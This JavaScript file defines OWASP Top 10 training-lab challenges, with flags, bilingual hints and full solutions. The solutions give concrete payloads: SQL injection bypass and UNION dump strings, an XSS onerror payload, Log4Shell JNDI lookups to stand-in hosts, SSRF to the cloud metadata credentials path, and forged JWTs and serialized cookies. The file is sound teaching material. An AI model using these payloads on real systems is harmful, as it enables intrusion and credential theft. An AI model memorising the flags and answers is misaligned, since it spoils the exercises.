/* Multi-challenge definitions per OWASP module — difficulty, hints, flags */
const CHALLENGES = (() => {
  const M = (ru, en) => ({ ru, en });
  const H = (h1ru, h1en, h2ru, h2en, solru, solen) => ([
    M(h1ru, h1en),
    M(h2ru, h2en),
    M(solru, solen),
  ]);

  const list = [
    /* ── A01 ─────────────────────────────────────── */
    {
      id: 'a01-idor-order', code: 'A01', diff: 1, points: 10,
      flag: 'FLAG{idor_order_admin_is_not_yours}',
      title: M('IDOR: чужой заказ', 'IDOR: another user\'s order'),
      goal: M('Как alice (user_id=2) получи заказ #100 (admin).', 'As alice (user_id=2), fetch order #100 (admin).'),
      hints: H(
        'Ты уже видишь свой заказ 101. API принимает любой id.',
        'You can already see your order 101. The API accepts any id.',
        'Попробуй GET с id=100 — без смены cookie.',
        'Try GET with id=100 — no cookie change needed.',
        'Введи 100 и нажми GET /api/orders/{id}.',
        'Set id to 100 and click GET /api/orders/{id}.'
      ),
    },
    {
      id: 'a01-mass-enum', code: 'A01', diff: 2, points: 20,
      flag: 'FLAG{idor_mass_enum_secret_pack}',
      title: M('IDOR: перебор заказов', 'IDOR: order enumeration'),
      goal: M('Найди заказ «Secret Red Team Pack» (id 100–110) и забери флаг.', 'Find the "Secret Red Team Pack" order (ids 100–110) and capture the flag.'),
      hints: H(
        'Перебери id в диапазоне 100–110.',
        'Enumerate ids in range 100–110.',
        'Ищи product, содержащий «Secret» или «Red Team».',
        'Look for a product containing "Secret" or "Red Team".',
        'Order id=103, userId=1, product=Secret Red Team Pack.',
        'Order id=103, userId=1, product=Secret Red Team Pack.'
      ),
    },
    {
      id: 'a01-vert-priv', code: 'A01', diff: 3, points: 30,
      flag: 'FLAG{vertical_priv_role_param}',
      title: M('Vertical: role в запросе', 'Vertical: role in request body'),
      goal: M('Сервер доверяет полю role из JSON. Стань admin без cookie-forgery.', 'Server trusts role from JSON. Become admin without cookie forgery.'),
      hints: H(
        'Есть endpoint «Promote me» / смена профиля.',
        'There is a "Promote me" / profile update endpoint.',
        'Отправь {"role":"admin"} — клиентское поле не проверяется.',
        'POST {"role":"admin"} — client-controlled field is not validated.',
        'Кнопка Promote: body role=admin → 200 admin panel flag.',
        'Use Promote button with role=admin → admin panel flag.'
      ),
    },

    /* ── A02 ─────────────────────────────────────── */
    {
      id: 'a02-jwt-none', code: 'A02', diff: 1, points: 10,
      flag: 'FLAG{jwt_alg_none_is_not_secure}',
      title: M('JWT alg:none', 'JWT alg:none'),
      goal: M('Собери alg:none + role=admin и вызови /admin/secret.', 'Build alg:none + role=admin and call /admin/secret.'),
      hints: H(
        'Header alg можно заменить на none.',
        'You can set header.alg to none.',
        'Подпись должна быть пустой (точка в конце).',
        'Signature must be empty (trailing dot).',
        'Кнопка «Собрать alg:none» + Verify.',
        'Use "Build alg:none" then Verify.'
      ),
    },
    {
      id: 'a02-weak-secret', code: 'A02', diff: 2, points: 20,
      flag: 'FLAG{jwt_weak_hmac_secret}',
      title: M('JWT: слабый секрет', 'JWT: weak HMAC secret'),
      goal: M('Сервер принимает HS256 с секретом «secret». Подпиши admin-токен.', 'Server accepts HS256 with secret "secret". Sign an admin token.'),
      hints: H(
        'Секрет из словаря: secret, password, jwt…',
        'Dictionary secret: secret, password, jwt…',
        'В lab введи secret и role=admin, нажми Sign HS256.',
        'In the lab enter secret and role=admin, click Sign HS256.',
        'secret=secret, payload.role=admin, алгоритм HS256.',
        'secret=secret, payload.role=admin, algorithm HS256.'
      ),
    },
    {
      id: 'a02-claim-tamper', code: 'A02', diff: 3, points: 25,
      flag: 'FLAG{jwt_claim_admin_no_verify}',
      title: M('JWT: verify выключен', 'JWT: verification disabled'),
      goal: M('Debug-режим не проверяет подпись — достаточно поменять payload.', 'Debug mode skips signature check — only payload matters.'),
      hints: H(
        'Включи «debug verify off».',
        'Enable "debug verify off".',
        'Достаточно base64 payload с role=admin.',
        'Base64 payload with role=admin is enough.',
        'Toggle debug + any JWT with role admin in payload.',
        'Toggle debug + any JWT with role admin in payload.'
      ),
    },

    /* ── A03 ─────────────────────────────────────── */
    {
      id: 'a03-sqli-bypass', code: 'A03', diff: 1, points: 10,
      flag: 'FLAG{sqli_login_bypass_comment}',
      title: M('SQLi: login bypass', 'SQLi: login bypass'),
      goal: M('Обойди login через SQL-инъекцию (admin\'-- или OR 1=1).', 'Bypass login via SQLi (admin\'-- or OR 1=1).'),
      hints: H(
        'Кавычка ломает SQL-строку.',
        'A quote breaks the SQL string.',
        'admin\'-- комментирует проверку пароля.',
        'admin\'-- comments out the password check.',
        'Username: admin\'--  Password: anything',
        'Username: admin\'--  Password: anything'
      ),
    },
    {
      id: 'a03-xss-reflected', code: 'A03', diff: 2, points: 15,
      flag: 'FLAG{xss_reflected_search_sink}',
      title: M('XSS: reflected search', 'XSS: reflected search'),
      goal: M('В search отрази payload, который выполнит JS (alert/onerror).', 'Reflect a payload that executes JS (alert/onerror) in search.'),
      hints: H(
        'Поле Search пишет HTML без encoding.',
        'Search field writes HTML without encoding.',
        'Попробуй <img src=x onerror=…> или <script>.',
        'Try <img src=x onerror=…> or <script>.',
        '<img src=x onerror=alert(1)> в Search → флаг.',
        '<img src=x onerror=alert(1)> in Search → flag.'
      ),
    },
    {
      id: 'a03-sqli-union', code: 'A03', diff: 3, points: 25,
      flag: 'FLAG{sqli_union_dump_table}',
      title: M('SQLi: UNION dump', 'SQLi: UNION dump'),
      goal: M('Через UNION в login username извлеки таблицу secrets.', 'Use UNION in login username to extract the secrets table.'),
      hints: H(
        'UNION SELECT требует то же число колонок, что users.',
        'UNION SELECT needs the same column count as users.',
        'Добавь UNION SELECT … FROM secrets в username.',
        'Put UNION SELECT … FROM secrets into username.',
        "' UNION SELECT key,secret_value,1,1,1 FROM secrets--",
        "' UNION SELECT key,secret_value,1,1,1 FROM secrets--"
      ),
    },

    /* ── A04 ─────────────────────────────────────── */
    {
      id: 'a04-otp-brute', code: 'A04', diff: 1, points: 10,
      flag: 'FLAG{otp_bruteforce_no_rate_limit}',
      title: M('OTP brute-force', 'OTP brute-force'),
      goal: M('Взломай 4-digit OTP (auto brute или вручную).', 'Crack the 4-digit OTP (auto brute or manually).'),
      hints: H(
        'Всего 10000 вариантов, rate limit нет.',
        'Only 10000 codes, no rate limit.',
        'Кнопка Auto brute-force.',
        'Use Auto brute-force button.',
        'Запусти Auto brute-force 0000–9999.',
        'Run Auto brute-force 0000–9999.'
      ),
    },
    {
      id: 'a04-sec-question', code: 'A04', diff: 2, points: 20,
      flag: 'FLAG{insecure_design_security_question}',
      title: M('Security question', 'Security question'),
      goal: M('Сбрось пароль через «секретный вопрос» с публичным ответом.', 'Reset password via a security question with a public answer.'),
      hints: H(
        'Вопрос про девичью фамилию / город рождения — OSINT-friendly.',
        'Maiden name / birth city questions are OSINT-friendly.',
        'В профиле alice утекает hometown.',
        'Alice profile leaks hometown.',
        'Ответ: Springfield (из профиля).',
        'Answer: Springfield (from profile).'
      ),
    },
    {
      id: 'a04-neg-balance', code: 'A04', diff: 3, points: 25,
      flag: 'FLAG{business_logic_negative_qty}',
      title: M('Business logic: qty', 'Business logic: qty'),
      goal: M('Купи товар с quantity ≤ 0 и получи «бесплатный» credit flag.', 'Buy with quantity ≤ 0 and get a free credit flag.'),
      hints: H(
        'Клиент шлёт quantity в JSON — сервер не валидирует знак.',
        'Client sends quantity in JSON — server does not validate sign.',
        'Попробуй quantity: -1.',
        'Try quantity: -1.',
        'POST cart quantity=-1 → negative total accepted.',
        'POST cart quantity=-1 → negative total accepted.'
      ),
    },

    /* ── A05 ─────────────────────────────────────── */
    {
      id: 'a05-debug-leak', code: 'A05', diff: 1, points: 10,
      flag: 'FLAG{debug_mode_leaks_secret_key}',
      title: M('DEBUG stack leak', 'DEBUG stack leak'),
      goal: M('Спровоцируй 500 и прочитай SECRET_KEY из стека.', 'Trigger 500 and read SECRET_KEY from the stack.'),
      hints: H(
        'Несуществующий user id даёт exception.',
        'A non-existent user id throws.',
        'Кнопка Trigger 500.',
        'Use Trigger 500.',
        'Trigger 500 → SECRET_KEY в ответе.',
        'Trigger 500 → SECRET_KEY in the response.'
      ),
    },
    {
      id: 'a05-cors-star', code: 'A05', diff: 2, points: 15,
      flag: 'FLAG{cors_star_with_credentials}',
      title: M('CORS misconfig', 'CORS misconfig'),
      goal: M('Найди опасную комбинацию ACAO:* + credentials.', 'Find the dangerous ACAO:* + credentials combo.'),
      hints: H(
        'Смотри response headers.',
        'Inspect response headers.',
        'Check security headers кнопка.',
        'Use Check security headers.',
        'Access-Control-Allow-Origin: * + Credentials: true.',
        'Access-Control-Allow-Origin: * + Credentials: true.'
      ),
    },
    {
      id: 'a05-default-creds', code: 'A05', diff: 2, points: 20,
      flag: 'FLAG{default_admin_admin_creds}',
      title: M('Default credentials', 'Default credentials'),
      goal: M('Войди в admin panel с заводскими admin:admin.', 'Log into admin panel with factory admin:admin.'),
      hints: H(
        'Дефолтные пары часто admin/admin.',
        'Default pairs are often admin/admin.',
        'Форма Admin panel login внизу лабы.',
        'Admin panel login form at the bottom of the lab.',
        'username=admin password=admin',
        'username=admin password=admin'
      ),
    },

    /* ── A06 ─────────────────────────────────────── */
    {
      id: 'a06-log4shell', code: 'A06', diff: 1, points: 15,
      flag: 'FLAG{log4shell_jndi_rce_detected}',
      title: M('Log4Shell JNDI', 'Log4Shell JNDI'),
      goal: M('Отправь JNDI payload в User-Agent.', 'Send a JNDI payload in User-Agent.'),
      hints: H(
        'Log4j резолвит ${jndi:…} в логах.',
        'Log4j resolves ${jndi:…} in logs.',
        'Insert Log4Shell payload кнопка.',
        'Use Insert Log4Shell payload.',
        '${jndi:ldap://evil.oast.fun/x} → Send.',
        '${jndi:ldap://evil.oast.fun/x} → Send.'
      ),
    },
    {
      id: 'a06-sbom-cve', code: 'A06', diff: 2, points: 15,
      flag: 'FLAG{sbom_found_log4j_cve}',
      title: M('SBOM: найди CVE', 'SBOM: find the CVE'),
      goal: M('Из SBOM укажи CVE для log4j-core 2.14.0.', 'From the SBOM, enter the CVE for log4j-core 2.14.0.'),
      hints: H(
        'Смотри таблицу зависимостей в лабе.',
        'Look at the dependency table in the lab.',
        'log4j-core==2.14.0 → известный CVE 2021…',
        'log4j-core==2.14.0 → famous CVE 2021…',
        'CVE-2021-44228',
        'CVE-2021-44228'
      ),
    },
    {
      id: 'a06-jndi-bypass', code: 'A06', diff: 3, points: 25,
      flag: 'FLAG{log4shell_lookup_bypass}',
      title: M('Log4Shell bypass', 'Log4Shell bypass'),
      goal: M('Обойди naive filter «jndi» через nested lookup.', 'Bypass a naive "jndi" filter via nested lookup.'),
      hints: H(
        'Фильтр ищет подстроку jndi в нижнем регистре.',
        'Filter looks for substring jndi lowercase.',
        'Используй ${${lower:j}ndi:…}.',
        'Use ${${lower:j}ndi:…}.',
        '${${lower:j}ndi:ldap://x/a}',
        '${${lower:j}ndi:ldap://x/a}'
      ),
    },

    /* ── A07 ─────────────────────────────────────── */
    {
      id: 'a07-session-forge', code: 'A07', diff: 1, points: 10,
      flag: 'FLAG{session_fix_admin_cookie}',
      title: M('Predictable session', 'Predictable session'),
      goal: M('Подмени cookie на user_id=1 (admin).', 'Forge cookie to user_id=1 (admin).'),
      hints: H(
        'Cookie = base64("user_id=N").',
        'Cookie = base64("user_id=N").',
        'Forge admin cookie кнопка.',
        'Use Forge admin cookie.',
        'btoa("user_id=1") → GET /api/me',
        'btoa("user_id=1") → GET /api/me'
      ),
    },
    {
      id: 'a07-stuffing', code: 'A07', diff: 2, points: 15,
      flag: 'FLAG{credential_stuffing_bob}',
      title: M('Credential stuffing', 'Credential stuffing'),
      goal: M('Войди как bob паролем из «утечки» (password).', 'Log in as bob with leaked password (password).'),
      hints: H(
        'В dump видны слабые пароли.',
        'The dump shows weak passwords.',
        'bob / password — classic reuse.',
        'bob / password — classic reuse.',
        'username=bob password=password',
        'username=bob password=password'
      ),
    },
    {
      id: 'a07-no-mfa', code: 'A07', diff: 3, points: 20,
      flag: 'FLAG{mfa_bypass_direct_api}',
      title: M('MFA bypass', 'MFA bypass'),
      goal: M('UI требует MFA, но /api/sensitive доступен сразу после login.', 'UI requires MFA, but /api/sensitive works right after login.'),
      hints: H(
        'MFA — только на фронте.',
        'MFA is front-end only.',
        'После login alice вызови Skip to sensitive API.',
        'After alice login, call Skip to sensitive API.',
        'Login alice/alice → Sensitive API без OTP.',
        'Login alice/alice → Sensitive API without OTP.'
      ),
    },

    /* ── A08 ─────────────────────────────────────── */
    {
      id: 'a08-deser-role', code: 'A08', diff: 1, points: 10,
      flag: 'FLAG{insecure_deser_role_admin}',
      title: M('Deser: role=admin', 'Deser: role=admin'),
      goal: M('В cookie profile смени role на admin.', 'Change role to admin in profile cookie.'),
      hints: H(
        'PHP serialize: s:4:"role";s:4:"user"',
        'PHP serialize: s:4:"role";s:4:"user"',
        'Длина строки в s:N:"…" должна совпасть.',
        'String length s:N:"…" must match.',
        's:5:"admin" — кнопка Set role=admin.',
        's:5:"admin" — use Set role=admin.'
      ),
    },
    {
      id: 'a08-deser-id', code: 'A08', diff: 2, points: 20,
      flag: 'FLAG{deser_spoof_user_id}',
      title: M('Deser: spoof id', 'Deser: spoof id'),
      goal: M('Оставь role=user, но id=1 — получи admin mailbox flag.', 'Keep role=user but id=1 — get admin mailbox flag.'),
      hints: H(
        'Поле id в сериализованном объекте тоже доверяется.',
        'The id field in the serialized object is trusted too.',
        'i:2 → i:1 в cookie.',
        'Change i:2 to i:1 in the cookie.',
        'O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:1;}',
        'O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:1;}'
      ),
    },
    {
      id: 'a08-unsigned-update', code: 'A08', diff: 3, points: 25,
      flag: 'FLAG{unsigned_plugin_install}',
      title: M('Unsigned update', 'Unsigned update'),
      goal: M('Установи «плагин» без подписи — integrity check отсутствует.', 'Install an unsigned "plugin" — no integrity check.'),
      hints: H(
        'Update channel не проверяет signature.',
        'Update channel does not verify signature.',
        'URL evil-plugin.zip принимается.',
        'URL evil-plugin.zip is accepted.',
        'Install plugin from http://evil.local/p.zip',
        'Install plugin from http://evil.local/p.zip'
      ),
    },

    /* ── A09 ─────────────────────────────────────── */
    {
      id: 'a09-hunt-ip', code: 'A09', diff: 1, points: 10,
      flag: 'FLAG{detected_bruteforce_from_logs}',
      title: M('Hunt attacker IP', 'Hunt attacker IP'),
      goal: M('Найди IP brute-force и опиши атаку.', 'Find the brute-force IP and describe the attack.'),
      hints: H(
        'Смотри WARN FAIL строки.',
        'Read WARN FAIL lines.',
        'IP 185.220… и слова bruteforce/export.',
        'IP 185.220… and words bruteforce/export.',
        'IP 185.220.101.47 + bruteforce export',
        'IP 185.220.101.47 + bruteforce export'
      ),
    },
    {
      id: 'a09-count-fails', code: 'A09', diff: 2, points: 15,
      flag: 'FLAG{siem_47_failed_logins}',
      title: M('Count failed logins', 'Count failed logins'),
      goal: M('Сколько FAIL attempt у атакующего до SUCCESS? (число)', 'How many FAIL attempts before SUCCESS? (number)'),
      hints: H(
        'В логе есть attempt=N.',
        'Logs contain attempt=N.',
        'Последний FAIL перед SUCCESS.',
        'Last FAIL before SUCCESS.',
        '47',
        '47'
      ),
    },
    {
      id: 'a09-exfil-table', code: 'A09', diff: 2, points: 15,
      flag: 'FLAG{siem_exfil_customers_table}',
      title: M('Exfil table name', 'Exfil table name'),
      goal: M('Какую table выгрузили в BULK_DOWNLOAD?', 'Which table was dumped in BULK_DOWNLOAD?'),
      hints: H(
        'Строка BULK_DOWNLOAD table=…',
        'Line BULK_DOWNLOAD table=…',
        'Имя таблицы — customers.',
        'Table name is customers.',
        'customers',
        'customers'
      ),
    },

    /* ── A10 ─────────────────────────────────────── */
    {
      id: 'a10-imds', code: 'A10', diff: 1, points: 15,
      flag: 'FLAG{ssrf_aws_imds_creds_stolen}',
      title: M('SSRF → IMDS creds', 'SSRF → IMDS creds'),
      goal: M('Через webhook получи IAM credentials с 169.254.169.254.', 'Via webhook, fetch IAM credentials from 169.254.169.254.'),
      hints: H(
        'Cloud metadata IP — 169.254.169.254.',
        'Cloud metadata IP is 169.254.169.254.',
        'Путь …/security-credentials/ec2-role',
        'Path …/security-credentials/ec2-role',
        'Кнопка IAM creds + Fetch.',
        'IAM creds button + Fetch.'
      ),
    },
    {
      id: 'a10-localhost', code: 'A10', diff: 2, points: 15,
      flag: 'FLAG{ssrf_internal_admin_panel}',
      title: M('SSRF → localhost admin', 'SSRF → localhost admin'),
      goal: M('Достань internal admin panel с 127.0.0.1:8080.', 'Fetch internal admin panel on 127.0.0.1:8080.'),
      hints: H(
        'Сервер ходит на любой URL.',
        'Server fetches any URL.',
        'http://127.0.0.1:8080/admin',
        'http://127.0.0.1:8080/admin',
        'Localhost button + Fetch.',
        'Localhost button + Fetch.'
      ),
    },
    {
      id: 'a10-fail-open', code: 'A10', diff: 3, points: 20,
      flag: 'FLAG{fail_open_error_handling}',
      title: M('Fail-open errors', 'Fail-open errors'),
      goal: M('Спровоцируй ошибку fetch и подтверди fail-open (HTTP 200 + debug).', 'Trigger fetch error and confirm fail-open (HTTP 200 + debug).'),
      hints: H(
        'Недоступный хост не должен давать 200 с debug.',
        'Unreachable host should not return 200 with debug.',
        'URL bad.invalid:1/',
        'URL bad.invalid:1/',
        'Fail-open error button + Fetch.',
        'Fail-open error button + Fetch.'
      ),
    },
  ];

  function byCode(code) {
    return list.filter(c => c.code === code);
  }
  function byId(id) {
    return list.find(c => c.id === id);
  }
  function totalPoints() {
    return list.reduce((s, c) => s + c.points, 0);
  }
  function diffLabel(d, lang) {
    if (lang === 'en') return d === 1 ? 'Easy' : d === 2 ? 'Medium' : 'Hard';
    return d === 1 ? 'Легко' : d === 2 ? 'Средне' : 'Сложно';
  }

  return { list, byCode, byId, totalPoints, diffLabel };
})();
